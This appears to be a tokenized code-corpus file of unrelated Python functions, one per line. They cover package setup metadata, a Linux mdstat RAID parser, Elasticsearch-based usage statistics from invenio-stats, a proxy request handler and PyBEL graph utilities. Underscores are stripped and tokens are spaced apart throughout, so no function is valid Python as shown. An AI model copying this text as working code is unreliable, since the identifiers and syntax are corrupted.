'requirements.txt' , setup = 'setup-requirements.txt' , test = 'test-requirements.txt' , ) requires = { } for key , filename in requirements files . items ( ) : requires [ key ] = [ ] if os . path . exists ( srcfile ( filename ) ) : with io . open ( srcfile ( filename ) , encoding = 'utf-8' ) as handle : for line in handle : line = line . strip ( ) if line and not line . startswith ( '#' ) : if any ( line . startswith ( i ) for i in ( '-e' , 'http://' , 'https://' ) ) : line = line . split ( '#egg=' ) [ 1 ] requires [ key ] . append ( line ) if not any ( 'pytest' == re . split ( '[\t ,<=>]' , i . lower ( ) ) [ 0 ] for i in requires [ 'test' ] ) : requires [ 'test' ] . append ( 'pytest' ) # add missing requirement # CLI entry points console scripts = [ ] for path , dirs , files in os . walk ( srcfile ( 'src' , package name ) ) : dirs = [ i for i in dirs if not i . startswith ( '.' ) ] if ' main .py' in files : path = path [ len ( srcfile ( 'src' ) + os . sep ) : ] appname = path . split ( os . sep ) [ - 1 ] with io . open ( srcfile ( 'src' , path , ' main .py' ) , encoding = 'utf-8' ) as handle : for line in handle . readlines ( ) : match = re . match ( r"""^ app name  += (?P<q>['"])(.+?)(?P=q)$""" , line ) if match : appname = match . group ( 2 ) console scripts . append ( '{0} = {1}. main :cli' . format ( appname , path . replace ( os . sep , '.' ) ) ) # Add some common files to EGG-INFO candidate files = [ 'LICENSE' , 'NOTICE' , 'README' , 'README.md' , 'README.rst' , 'README.txt' , 'CHANGES' , 'CHANGELOG' , 'debian/changelog' , ] data files = defaultdict ( list ) for filename in candidate files : if os . path . exists ( srcfile ( filename ) ) : data files [ 'EGG-INFO' ] . append ( filename ) # Complete project metadata classifiers = [ ] for classifiers txt in ( 'classifiers.txt' , 'project.d/classifiers.txt' ) : classifiers txt = srcfile ( classifiers txt ) if os . path . exists ( classifiers txt ) : with io . open ( classifiers txt , encoding = 'utf-8' ) as handle : classifiers = [ i . strip ( ) for i in handle if i . strip ( ) and not i . startswith ( '#' ) ] break entry points . setdefault ( 'console scripts' , [ ] ) . extend ( console scripts ) metadata . update ( dict ( name = name , package dir = { '' : 'src' } , packages = find packages ( srcfile ( 'src' ) , exclude = [ 'tests' ] ) , data files = data files . items ( ) , zip safe = False , include package data = True , install requires = requires [ 'install' ] , setup requires = requires [ 'setup' ] , tests require = requires [ 'test' ] , classifiers = classifiers , cmdclass = dict ( test = Py Test , ) , entry points = entry points , ) ) return metadata
def load ( self ) : ret = { } # Read the mdstat file with open ( self . get path ( ) , 'r' ) as f : # lines is a list of line (with \n) lines = f . readlines ( ) # First line: get the personalities # The "Personalities" line tells you what RAID level the kernel currently supports. # This can be changed by either changing the raid modules or recompiling the kernel. # Possible personalities include: [raid0] [raid1] [raid4] [raid5] [raid6] [linear] [multipath] [faulty] ret [ 'personalities' ] = self . get personalities ( lines [ 0 ] ) # Second to last before line: Array definition ret [ 'arrays' ] = self . get arrays ( lines [ 1 : - 1 ] , ret [ 'personalities' ] ) # Save the file content as it for the  str  method self . content = reduce ( lambda x , y : x + y , lines ) return ret
def get personalities ( self , line ) : return [ split ( '\W+' , i ) [ 1 ] for i in line . split ( ':' ) [ 1 ] . split ( ' ' ) if i . startswith ( '[' ) ]
def get arrays ( self , lines , personalities = [ ] ) : ret = { } i = 0 while i < len ( lines ) : try : # First array line: get the md device md device = self . get md device name ( lines [ i ] ) except Index Error : # No array detected pass else : # Array detected if md device is not None : # md device line ret [ md device ] = self . get md device ( lines [ i ] , personalities ) # md config/status line i += 1 ret [ md device ] . update ( self . get md status ( lines [ i ] ) ) i += 1 return ret
def get md device ( self , line , personalities = [ ] ) : ret = { } splitted = split ( '\W+' , line ) # Raid status # Active or 'started'. An inactive array is usually faulty. # Stopped arrays aren't visible here. ret [ 'status' ] = splitted [ 1 ] if splitted [ 2 ] in personalities : # Raid type (ex: RAID5) ret [ 'type' ] = splitted [ 2 ] # Array's components ret [ 'components' ] = self . get components ( line , with type = True ) else : # Raid type (ex: RAID5) ret [ 'type' ] = None # Array's components ret [ 'components' ] = self . get components ( line , with type = False ) return ret
def get md status ( self , line ) : ret = { } splitted = split ( '\W+' , line ) if len ( splitted ) < 7 : ret [ 'available' ] = None ret [ 'used' ] = None ret [ 'config' ] = None else : # The final 2 entries on this line: [n/m] [UUUU ] # [n/m] means that ideally the array would have n devices however, currently, m devices are in use. # Obviously when m >= n then things are good. ret [ 'available' ] = splitted [ - 4 ] ret [ 'used' ] = splitted [ - 3 ] # [UUUU ] represents the status of each device, either U for up or   for down. ret [ 'config' ] = splitted [ - 2 ] return ret
def register receivers ( app , config ) : for event name , event config in config . items ( ) : event builders = [ obj or import string ( func ) for func in event config . get ( 'event builders' , [ ] ) ] signal = obj or import string ( event config [ 'signal' ] ) signal . connect ( Event Emmiter ( event name , event builders ) , sender = app , weak = False )
def set scheduled ( self ) : with self . idle lock : if self . idle : self . idle = False return True return False
def get oldest event timestamp ( self ) : # Retrieve the oldest event in order to start aggregation # from there query events = Search ( using = self . client , index = self . event index ) [ 0 : 1 ] . sort ( { 'timestamp' : { 'order' : 'asc' } } ) result = query events . execute ( ) # There might not be any events yet if the first event have been # indexed but the indices have not been refreshed yet. if len ( result ) == 0 : return None return parser . parse ( result [ 0 ] [ 'timestamp' ] )
def get bookmark ( self ) : if not Index ( self . aggregation alias , using = self . client ) . exists ( ) : if not Index ( self . event index , using = self . client ) . exists ( ) : return datetime . date . today ( ) return self . get oldest event timestamp ( ) # retrieve the oldest bookmark query bookmark = Search ( using = self . client , index = self . aggregation alias , doc type = self . bookmark doc type ) [ 0 : 1 ] . sort ( { 'date' : { 'order' : 'desc' } } ) bookmarks = query bookmark . execute ( ) # if no bookmark is found but the index exist, the bookmark was somehow # lost or never written, so restart from the beginning if len ( bookmarks ) == 0 : return self . get oldest event timestamp ( ) # change it to doc id suffix bookmark = datetime . datetime . strptime ( bookmarks [ 0 ] . date , self . doc id suffix ) return bookmark
def set bookmark ( self ) : def success date ( ) : bookmark = { 'date' : self . new bookmark or datetime . datetime . utcnow ( ) . strftime ( self . doc id suffix ) } yield dict ( index = self . last index written , type = self . bookmark doc type , source = bookmark ) if self . last index written : bulk ( self . client , success date ( ) , stats only = True )
def format range dt ( self , d ) : if not isinstance ( d , six . string types ) : d = d . isoformat ( ) return '{0}||/{1}' . format ( d , self . dt rounding map [ self . aggregation interval ] )
def agg iter ( self , lower limit = None , upper limit = None ) : lower limit = lower limit or self . get bookmark ( ) . isoformat ( ) upper limit = upper limit or ( datetime . datetime . utcnow ( ) . replace ( microsecond = 0 ) . isoformat ( ) ) aggregation data = { } self . agg query = Search ( using = self . client , index = self . event index ) . filter ( 'range' , timestamp = { 'gte' : self . format range dt ( lower limit ) , 'lte' : self . format range dt ( upper limit ) } ) # apply query modifiers for modifier in self . query modifiers : self . agg query = modifier ( self . agg query ) hist = self . agg query . aggs . bucket ( 'histogram' , 'date histogram' , field = 'timestamp' , interval = self . aggregation interval ) terms = hist . bucket ( 'terms' , 'terms' , field = self . aggregation field , size = 0 ) top = terms . metric ( 'top hit' , 'top hits' , size = 1 , sort = { 'timestamp' : 'desc' } ) for dst , ( metric , src , opts ) in self . metric aggregation fields . items ( ) : terms . metric ( dst , metric , field = src , * * opts ) results = self . agg query . execute ( ) index name = None for interval in results . aggregations [ 'histogram' ] . buckets : interval date = datetime . datetime . strptime ( interval [ 'key as string' ] , '%Y-%m-%d T%H:%M:%S' ) for aggregation in interval [ 'terms' ] . buckets : aggregation data [ 'timestamp' ] = interval date . isoformat ( ) aggregation data [ self . aggregation field ] = aggregation [ 'key' ] aggregation data [ 'count' ] = aggregation [ 'doc count' ] if self . metric aggregation fields : for f in self . metric aggregation fields : aggregation data [ f ] = aggregation [ f ] [ 'value' ] doc = aggregation . top hit . hits . hits [ 0 ] [ ' source' ] for destination , source in self . copy fields . items ( ) : if isinstance ( source , six . string types ) : aggregation data [ destination ] = doc [ source ] else : aggregation data [ destination ] = source ( doc , aggregation data ) index name = 'stats-{0}-{1}' . format ( self . event , interval date . strftime ( self . index name suffix ) ) self . indices . add ( index name ) yield dict ( id = '{0}-{1}' . format ( aggregation [ 'key' ] , interval date . strftime ( self . doc id suffix ) ) , index = index name , type = self . aggregation doc type , source = aggregation data ) self . last index written = index name
def run ( self , start date = None , end date = None , update bookmark = True ) : # If no events have been indexed there is nothing to aggregate if not Index ( self . event index , using = self . client ) . exists ( ) : return lower limit = start date or self . get bookmark ( ) # Stop here if no bookmark could be estimated. if lower limit is None : return upper limit = min ( end date or datetime . datetime . max , # ignore if `None` datetime . datetime . utcnow ( ) . replace ( microsecond = 0 ) , datetime . datetime . combine ( lower limit + datetime . timedelta ( self . batch size ) , datetime . datetime . min . time ( ) ) ) while upper limit <= datetime . datetime . utcnow ( ) : self . indices = set ( ) self . new bookmark = upper limit . strftime ( self . doc id suffix ) bulk ( self . client , self . agg iter ( lower limit , upper limit ) , stats only = True , chunk size = 50 ) # Flush all indices which have been modified current search client . indices . flush ( index = ',' . join ( self . indices ) , wait if ongoing = True ) if update bookmark : self . set bookmark ( ) self . indices = set ( ) lower limit = lower limit + datetime . timedelta ( self . batch size ) upper limit = min ( end date or datetime . datetime . max , # ignore if `None`` datetime . datetime . utcnow ( ) . replace ( microsecond = 0 ) , lower limit + datetime . timedelta ( self . batch size ) ) if lower limit > upper limit : break
def list bookmarks ( self , start date = None , end date = None , limit = None ) : query = Search ( using = self . client , index = self . aggregation alias , doc type = self . bookmark doc type ) . sort ( { 'date' : { 'order' : 'desc' } } ) range args = { } if start date : range args [ 'gte' ] = self . format range dt ( start date . replace ( microsecond = 0 ) ) if end date : range args [ 'lte' ] = self . format range dt ( end date . replace ( microsecond = 0 ) ) if range args : query = query . filter ( 'range' , date = range args ) return query [ 0 : limit ] . execute ( ) if limit else query . scan ( )
def delete ( self , start date = None , end date = None ) : aggs query = Search ( using = self . client , index = self . aggregation alias , doc type = self . aggregation doc type ) . extra ( source = False ) range args = { } if start date : range args [ 'gte' ] = self . format range dt ( start date . replace ( microsecond = 0 ) ) if end date : range args [ 'lte' ] = self . format range dt ( end date . replace ( microsecond = 0 ) ) if range args : aggs query = aggs query . filter ( 'range' , timestamp = range args ) bookmarks query = Search ( using = self . client , index = self . aggregation alias , doc type = self . bookmark doc type ) . sort ( { 'date' : { 'order' : 'desc' } } ) if range args : bookmarks query = bookmarks query . filter ( 'range' , date = range args ) def delete actions ( ) : for query in ( aggs query , bookmarks query ) : affected indices = set ( ) for doc in query . scan ( ) : affected indices . add ( doc . meta . index ) yield dict ( index = doc . meta . index , op type = 'delete' , id = doc . meta . id , type = doc . meta . doc type ) current search client . indices . flush ( index = ',' . join ( affected indices ) , wait if ongoing = True ) bulk ( self . client , delete actions ( ) , refresh = True )
def get ( self , timeout = None ) : result = None try : result = self . result . get ( True , timeout = timeout ) except Empty : raise Timeout ( ) if isinstance ( result , Failure ) : six . reraise ( * result . exc info ) else : return result
def events process ( event types = None , eager = False ) : event types = event types or list ( current stats . enabled events ) if eager : process events . apply ( ( event types , ) , throw = True ) click . secho ( 'Events processed successfully.' , fg = 'green' ) else : process events . delay ( event types ) click . secho ( 'Events processing task sent...' , fg = 'yellow' )
def aggregations process ( aggregation types = None , start date = None , end date = None , update bookmark = False , eager = False ) : aggregation types = ( aggregation types or list ( current stats . enabled aggregations ) ) if eager : aggregate events . apply ( ( aggregation types , ) , dict ( start date = start date , end date = end date , update bookmark = update bookmark ) , throw = True ) click . secho ( 'Aggregations processed successfully.' , fg = 'green' ) else : aggregate events . delay ( aggregation types , start date = start date , end date = end date ) click . secho ( 'Aggregations processing task sent...' , fg = 'yellow' )
def aggregations delete ( aggregation types = None , start date = None , end date = None ) : aggregation types = ( aggregation types or list ( current stats . enabled aggregations ) ) for a in aggregation types : aggr cfg = current stats . aggregations [ a ] aggregator = aggr cfg . aggregator class ( name = aggr cfg . name , * * aggr cfg . aggregator config ) aggregator . delete ( start date , end date )
def aggregations list bookmarks ( aggregation types = None , start date = None , end date = None , limit = None ) : aggregation types = ( aggregation types or list ( current stats . enabled aggregations ) ) for a in aggregation types : aggr cfg = current stats . aggregations [ a ] aggregator = aggr cfg . aggregator class ( name = aggr cfg . name , * * aggr cfg . aggregator config ) bookmarks = aggregator . list bookmarks ( start date , end date , limit ) click . echo ( '{}:' . format ( a ) ) for b in bookmarks : click . echo ( ' - {}' . format ( b . date ) )
def events config ( self ) : # import iter entry points here so that it can be mocked in tests result = { } for ep in iter entry points ( group = self . entry point group events ) : for cfg in ep . load ( ) ( ) : if cfg [ 'event type' ] not in self . enabled events : continue elif cfg [ 'event type' ] in result : raise Duplicate Event Error ( 'Duplicate event {0} in entry point ' '{1}' . format ( cfg [ 'event type' ] , ep . name ) ) # Update the default configuration with env/overlay config. cfg . update ( self . enabled events [ cfg [ 'event type' ] ] or { } ) result [ cfg [ 'event type' ] ] = cfg return result
def aggregations config ( self ) : result = { } for ep in iter entry points ( group = self . entry point group aggs ) : for cfg in ep . load ( ) ( ) : if cfg [ 'aggregation name' ] not in self . enabled aggregations : continue elif cfg [ 'aggregation name' ] in result : raise Duplicate Aggregation Error ( 'Duplicate aggregation {0} in entry point ' '{1}' . format ( cfg [ 'event type' ] , ep . name ) ) # Update the default configuration with env/overlay config. cfg . update ( self . enabled aggregations [ cfg [ 'aggregation name' ] ] or { } ) result [ cfg [ 'aggregation name' ] ] = cfg return result
def queries config ( self ) : result = { } for ep in iter entry points ( group = self . entry point group queries ) : for cfg in ep . load ( ) ( ) : if cfg [ 'query name' ] not in self . enabled queries : continue elif cfg [ 'query name' ] in result : raise Duplicate Query Error ( 'Duplicate query {0} in entry point ' '{1}' . format ( cfg [ 'query' ] , ep . name ) ) # Update the default configuration with env/overlay config. cfg . update ( self . enabled queries [ cfg [ 'query name' ] ] or { } ) result [ cfg [ 'query name' ] ] = cfg return result
def consume ( self , event type , no ack = True , payload = True ) : assert event type in self . events return current queues . queues [ 'stats-{}' . format ( event type ) ] . consume ( payload = payload )
def init app ( self , app , entry point group events = 'invenio stats.events' , entry point group aggs = 'invenio stats.aggregations' , entry point group queries = 'invenio stats.queries' ) : self . init config ( app ) state = Invenio Stats State ( app , entry point group events = entry point group events , entry point group aggs = entry point group aggs , entry point group queries = entry point group queries ) self . state = app . extensions [ 'invenio-stats' ] = state if app . config [ 'STATS REGISTER RECEIVERS' ] : signal receivers = { key : value for key , value in app . config . get ( 'STATS EVENTS' , { } ) . items ( ) if 'signal' in value } register receivers ( app , signal receivers ) return state
def get anonymization salt ( ts ) : salt key = 'stats:salt:{}' . format ( ts . date ( ) . isoformat ( ) ) salt = current cache . get ( salt key ) if not salt : salt bytes = os . urandom ( 32 ) salt = b64encode ( salt bytes ) . decode ( 'utf-8' ) current cache . set ( salt key , salt , timeout = 60 * 60 * 24 ) return salt
def get geoip ( ip ) : reader = geolite2 . reader ( ) ip data = reader . get ( ip ) or { } return ip data . get ( 'country' , { } ) . get ( 'iso code' )
def register templates ( ) : event templates = [ current stats . events config [ e ] [ 'templates' ] for e in current stats . events config ] aggregation templates = [ current stats . aggregations config [ a ] [ 'templates' ] for a in current stats . aggregations config ] return event templates + aggregation templates
def process events ( event types ) : results = [ ] for e in event types : processor = current stats . events [ e ] . processor class ( * * current stats . events [ e ] . processor config ) results . append ( ( e , processor . run ( ) ) ) return results
def aggregate events ( aggregations , start date = None , end date = None , update bookmark = True ) : start date = dateutil parse ( start date ) if start date else None end date = dateutil parse ( end date ) if end date else None results = [ ] for a in aggregations : aggr cfg = current stats . aggregations [ a ] aggregator = aggr cfg . aggregator class ( name = aggr cfg . name , * * aggr cfg . aggregator config ) results . append ( aggregator . run ( start date , end date , update bookmark ) ) return results
def handle request ( self , scheme , netloc , path , headers , body = None , method = "GET" ) : backend url = "{}://{}{}" . format ( scheme , netloc , path ) try : response = self . http request . request ( backend url , method = method , body = body , headers = dict ( headers ) ) self . return response ( response ) except Exception as e : body = "Invalid response from backend: '{}' Server might be busy" . format ( e . message ) logging . debug ( body ) self . send error ( httplib . SERVICE UNAVAILABLE , body )
def hash id ( iso timestamp , msg ) : return '{0}-{1}' . format ( iso timestamp , hashlib . sha1 ( msg . get ( 'unique id' ) . encode ( 'utf-8' ) + str ( msg . get ( 'visitor id' ) ) . encode ( 'utf-8' ) ) . hexdigest ( ) )
def run ( self ) : return elasticsearch . helpers . bulk ( self . client , self . actionsiter ( ) , stats only = True , chunk size = 50 )
def register events ( ) : return [ dict ( event type = 'file-download' , templates = 'invenio stats.contrib.file download' , processor class = Events Indexer , processor config = dict ( preprocessors = [ flag robots , anonymize user , build file unique id ] ) ) , dict ( event type = 'record-view' , templates = 'invenio stats.contrib.record view' , processor class = Events Indexer , processor config = dict ( preprocessors = [ flag robots , anonymize user , build record unique id ] ) ) ]
def register aggregations ( ) : return [ dict ( aggregation name = 'file-download-agg' , templates = 'invenio stats.contrib.aggregations.aggr file download' , aggregator class = Stat Aggregator , aggregator config = dict ( client = current search client , event = 'file-download' , aggregation field = 'unique id' , aggregation interval = 'day' , copy fields = dict ( file key = 'file key' , bucket id = 'bucket id' , file id = 'file id' , ) , metric aggregation fields = { 'unique count' : ( 'cardinality' , 'unique session id' , { 'precision threshold' : 1000 } ) , 'volume' : ( 'sum' , 'size' , { } ) , } , ) ) , dict ( aggregation name = 'record-view-agg' , templates = 'invenio stats.contrib.aggregations.aggr record view' , aggregator class = Stat Aggregator , aggregator config = dict ( client = current search client , event = 'record-view' , aggregation field = 'unique id' , aggregation interval = 'day' , copy fields = dict ( record id = 'record id' , pid type = 'pid type' , pid value = 'pid value' , ) , metric aggregation fields = { 'unique count' : ( 'cardinality' , 'unique session id' , { 'precision threshold' : 1000 } ) , } , ) ) ]
def declare queues ( ) : return [ dict ( name = 'stats-{0}' . format ( event [ 'event type' ] ) , exchange = current stats . exchange ) for event in current stats . events config . values ( ) ]
def validate arguments ( self , interval , start date , end date , * * kwargs ) : if interval not in self . allowed intervals : raise Invalid Request Input Error ( 'Invalid aggregation time interval for statistic {}.' ) . format ( self . query name ) if set ( kwargs ) < set ( self . required filters ) : raise Invalid Request Input Error ( 'Missing one of the required parameters {0} in ' 'query {1}' . format ( set ( self . required filters . keys ( ) ) , self . query name ) )
def build query ( self , interval , start date , end date , * * kwargs ) : agg query = Search ( using = self . client , index = self . index , doc type = self . doc type ) [ 0 : 0 ] if start date is not None or end date is not None : time range = { } if start date is not None : time range [ 'gte' ] = start date . isoformat ( ) if end date is not None : time range [ 'lte' ] = end date . isoformat ( ) agg query = agg query . filter ( 'range' , * * { self . time field : time range } ) for modifier in self . query modifiers : agg query = modifier ( agg query , * * kwargs ) base agg = agg query . aggs . bucket ( 'histogram' , 'date histogram' , field = self . time field , interval = interval ) for destination , ( metric , field , opts ) in self . metric fields . items ( ) : base agg . metric ( destination , metric , field = field , * * opts ) if self . copy fields : base agg . metric ( 'top hit' , 'top hits' , size = 1 , sort = { 'timestamp' : 'desc' } ) for query param , filtered field in self . required filters . items ( ) : if query param in kwargs : agg query = agg query . filter ( 'term' , * * { filtered field : kwargs [ query param ] } ) return agg query
def process query result ( self , query result , interval , start date , end date ) : def build buckets ( agg ) : """Build recursively result buckets.""" bucket result = dict ( key = agg [ 'key' ] , date = agg [ 'key as string' ] , ) for metric in self . metric fields : bucket result [ metric ] = agg [ metric ] [ 'value' ] if self . copy fields and agg [ 'top hit' ] [ 'hits' ] [ 'hits' ] : doc = agg [ 'top hit' ] [ 'hits' ] [ 'hits' ] [ 0 ] [ ' source' ] for destination , source in self . copy fields . items ( ) : if isinstance ( source , six . string types ) : bucket result [ destination ] = doc [ source ] else : bucket result [ destination ] = source ( bucket result , doc ) return bucket result # Add copy fields buckets = query result [ 'aggregations' ] [ 'histogram' ] [ 'buckets' ] return dict ( interval = interval , key type = 'date' , start date = start date . isoformat ( ) if start date else None , end date = end date . isoformat ( ) if end date else None , buckets = [ build buckets ( b ) for b in buckets ] )
def validate arguments ( self , start date , end date , * * kwargs ) : if set ( kwargs ) < set ( self . required filters ) : raise Invalid Request Input Error ( 'Missing one of the required parameters {0} in ' 'query {1}' . format ( set ( self . required filters . keys ( ) ) , self . query name ) )
def build query ( self , start date , end date , * * kwargs ) : agg query = Search ( using = self . client , index = self . index , doc type = self . doc type ) [ 0 : 0 ] if start date is not None or end date is not None : time range = { } if start date is not None : time range [ 'gte' ] = start date . isoformat ( ) if end date is not None : time range [ 'lte' ] = end date . isoformat ( ) agg query = agg query . filter ( 'range' , * * { self . time field : time range } ) for modifier in self . query modifiers : agg query = modifier ( agg query , * * kwargs ) base agg = agg query . aggs def apply metric aggs ( agg ) : for dst , ( metric , field , opts ) in self . metric fields . items ( ) : agg . metric ( dst , metric , field = field , * * opts ) apply metric aggs ( base agg ) if self . aggregated fields : cur agg = base agg for term in self . aggregated fields : cur agg = cur agg . bucket ( term , 'terms' , field = term , size = 0 ) apply metric aggs ( cur agg ) if self . copy fields : base agg . metric ( 'top hit' , 'top hits' , size = 1 , sort = { 'timestamp' : 'desc' } ) for query param , filtered field in self . required filters . items ( ) : if query param in kwargs : agg query = agg query . filter ( 'term' , * * { filtered field : kwargs [ query param ] } ) return agg query
def process query result ( self , query result , start date , end date ) : def build buckets ( agg , fields , bucket result ) : """Build recursively result buckets.""" # Add metric results for current bucket for metric in self . metric fields : bucket result [ metric ] = agg [ metric ] [ 'value' ] if fields : current level = fields [ 0 ] bucket result . update ( dict ( type = 'bucket' , field = current level , key type = 'terms' , buckets = [ build buckets ( b , fields [ 1 : ] , dict ( key = b [ 'key' ] ) ) for b in agg [ current level ] [ 'buckets' ] ] ) ) return bucket result # Add copy fields aggs = query result [ 'aggregations' ] result = dict ( start date = start date . isoformat ( ) if start date else None , end date = end date . isoformat ( ) if end date else None , ) if self . copy fields and aggs [ 'top hit' ] [ 'hits' ] [ 'hits' ] : doc = aggs [ 'top hit' ] [ 'hits' ] [ 'hits' ] [ 0 ] [ ' source' ] for destination , source in self . copy fields . items ( ) : if isinstance ( source , six . string types ) : result [ destination ] = doc [ source ] else : result [ destination ] = source ( result , doc ) return build buckets ( aggs , self . aggregated fields , result )
def run ( self , start date = None , end date = None , * * kwargs ) : start date = self . extract date ( start date ) if start date else None end date = self . extract date ( end date ) if end date else None self . validate arguments ( start date , end date , * * kwargs ) agg query = self . build query ( start date , end date , * * kwargs ) query result = agg query . execute ( ) . to dict ( ) res = self . process query result ( query result , start date , end date ) return res
def file download event builder ( event , sender app , obj = None , * * kwargs ) : event . update ( dict ( # When: timestamp = datetime . datetime . utcnow ( ) . isoformat ( ) , # What: bucket id = str ( obj . bucket id ) , file id = str ( obj . file id ) , file key = obj . key , size = obj . file . size , referrer = request . referrer , # Who: * * get user ( ) ) ) return event
def record view event builder ( event , sender app , pid = None , record = None , * * kwargs ) : event . update ( dict ( # When: timestamp = datetime . datetime . utcnow ( ) . isoformat ( ) , # What: record id = str ( record . id ) , pid type = pid . pid type , pid value = str ( pid . pid value ) , referrer = request . referrer , # Who: * * get user ( ) ) ) return event
def is root ( ) : import os import ctypes try : return os . geteuid ( ) == 0 except Attribute Error : return ctypes . windll . shell32 . Is User An Admin ( ) != 0 return False
def to jupyter ( graph : BEL Graph , chart : Optional [ str ] = None ) -> Javascript : with open ( os . path . join ( HERE , 'render with javascript.js' ) , 'rt' ) as f : js template = Template ( f . read ( ) ) return Javascript ( js template . render ( * * get context ( graph , chart = chart ) ) )
def prerender ( graph : BEL Graph ) -> Mapping [ str , Mapping [ str , Any ] ] : import bio2bel hgnc from bio2bel hgnc . models import Human Gene graph : BEL Graph = graph . copy ( ) enrich protein and rna origins ( graph ) collapse all variants ( graph ) genes : Set [ Gene ] = get nodes by function ( graph , GENE ) hgnc symbols = { gene . name for gene in genes if gene . namespace . lower ( ) == 'hgnc' } result = { } hgnc manager = bio2bel hgnc . Manager ( ) human genes = ( hgnc manager . session . query ( Human Gene . symbol , Human Gene . location ) . filter ( Human Gene . symbol . in ( hgnc symbols ) ) . all ( ) ) for human gene in human genes : result [ human gene . symbol ] = { 'name' : human gene . symbol , 'chr' : ( human gene . location . split ( 'q' ) [ 0 ] if 'q' in human gene . location else human gene . location . split ( 'p' ) [ 0 ] ) , } df = get df ( ) for , ( gene id , symbol , start , stop ) in df [ df [ 'Symbol' ] . isin ( hgnc symbols ) ] . iterrows ( ) : result [ symbol ] [ 'start' ] = start result [ symbol ] [ 'stop' ] = stop return result
def get correlation graph ( graph : BEL Graph ) -> Graph : result = Graph ( ) for u , v , d in graph . edges ( data = True ) : if d [ RELATION ] not in CORRELATIVE RELATIONS : continue if not result . has edge ( u , v ) : result . add edge ( u , v , * * { d [ RELATION ] : True } ) elif d [ RELATION ] not in result [ u ] [ v ] : log . log ( 5 , 'broken correlation relation for %s, %s' , u , v ) result [ u ] [ v ] [ d [ RELATION ] ] = True result [ v ] [ u ] [ d [ RELATION ] ] = True return result
def get correlation triangles ( graph : BEL Graph ) -> Set Of Node Triples : return { tuple ( sorted ( [ n , u , v ] , key = str ) ) for n in graph for u , v in itt . combinations ( graph [ n ] , 2 ) if graph . has edge ( u , v ) }
def summarize stability ( graph : BEL Graph ) -> Mapping [ str , int ] : regulatory pairs = get regulatory pairs ( graph ) chaotic pairs = get chaotic pairs ( graph ) dampened pairs = get dampened pairs ( graph ) contraditory pairs = get contradiction summary ( graph ) separately unstable triples = get separate unstable correlation triples ( graph ) mutually unstable triples = get mutually unstable correlation triples ( graph ) jens unstable triples = get jens unstable ( graph ) increase mismatch triples = get increase mismatch triplets ( graph ) decrease mismatch triples = get decrease mismatch triplets ( graph ) chaotic triples = get chaotic triplets ( graph ) dampened triples = get dampened triplets ( graph ) return { 'Regulatory Pairs' : count or len ( regulatory pairs ) , 'Chaotic Pairs' : count or len ( chaotic pairs ) , 'Dampened Pairs' : count or len ( dampened pairs ) , 'Contradictory Pairs' : count or len ( contraditory pairs ) , 'Separately Unstable Triples' : count or len ( separately unstable triples ) , 'Mutually Unstable Triples' : count or len ( mutually unstable triples ) , 'Jens Unstable Triples' : count or len ( jens unstable triples ) , 'Increase Mismatch Triples' : count or len ( increase mismatch triples ) , 'Decrease Mismatch Triples' : count or len ( decrease mismatch triples ) , 'Chaotic Triples' : count or len ( chaotic triples ) , 'Dampened Triples' : count or len ( dampened triples ) }
def flatten list abundance ( node : List Abundance ) -> List Abundance : return node . class ( list ( chain . from iterable ( ( flatten list abundance ( member ) . members if isinstance ( member , List Abundance ) else [ member ] ) for member in node . members ) ) )
def list abundance expansion ( graph : BEL Graph ) -> None : mapping = { node : flatten list abundance ( node ) for node in graph if isinstance ( node , List Abundance ) } relabel nodes ( graph , mapping , copy = False )
def list abundance cartesian expansion ( graph : BEL Graph ) -> None : for u , v , k , d in list ( graph . edges ( keys = True , data = True ) ) : if CITATION not in d : continue if isinstance ( u , List Abundance ) and isinstance ( v , List Abundance ) : for u member , v member in itt . product ( u . members , v . members ) : graph . add qualified edge ( u member , v member , relation = d [ RELATION ] , citation = d . get ( CITATION ) , evidence = d . get ( EVIDENCE ) , annotations = d . get ( ANNOTATIONS ) , ) elif isinstance ( u , List Abundance ) : for member in u . members : graph . add qualified edge ( member , v , relation = d [ RELATION ] , citation = d . get ( CITATION ) , evidence = d . get ( EVIDENCE ) , annotations = d . get ( ANNOTATIONS ) , ) elif isinstance ( v , List Abundance ) : for member in v . members : graph . add qualified edge ( u , member , relation = d [ RELATION ] , citation = d . get ( CITATION ) , evidence = d . get ( EVIDENCE ) , annotations = d . get ( ANNOTATIONS ) , ) remove list abundance nodes ( graph )
def reaction cartesion expansion unqualified helper ( graph : BEL Graph , u : Base Entity , v : Base Entity , d : dict , ) -> None : if isinstance ( u , Reaction ) and isinstance ( v , Reaction ) : enzymes = get catalysts in reaction ( u ) | get catalysts in reaction ( v ) for reactant , product in chain ( itt . product ( u . reactants , u . products ) , itt . product ( v . reactants , v . products ) ) : if reactant in enzymes or product in enzymes : continue graph . add unqualified edge ( reactant , product , INCREASES ) for product , reactant in itt . product ( u . products , u . reactants ) : if reactant in enzymes or product in enzymes : continue graph . add unqualified edge ( product , reactant , d [ RELATION ] , ) elif isinstance ( u , Reaction ) : enzymes = get catalysts in reaction ( u ) for product in u . products : # Skip create increases edges between enzymes if product in enzymes : continue # Only add edge between v and reaction if the node is not part of the reaction # In practice skips has Reactant, has Product edges if v not in u . products and v not in u . reactants : graph . add unqualified edge ( product , v , INCREASES ) for reactant in u . reactants : graph . add unqualified edge ( reactant , product , INCREASES ) elif isinstance ( v , Reaction ) : enzymes = get catalysts in reaction ( v ) for reactant in v . reactants : # Skip create increases edges between enzymes if reactant in enzymes : continue # Only add edge between v and reaction if the node is not part of the reaction # In practice skips has Reactant, has Product edges if u not in v . products and u not in v . reactants : graph . add unqualified edge ( u , reactant , INCREASES ) for product in v . products : graph . add unqualified edge ( reactant , product , INCREASES )
def get catalysts in reaction ( reaction : Reaction ) -> Set [ Base Abundance ] : return { reactant for reactant in reaction . reactants if reactant in reaction . products }
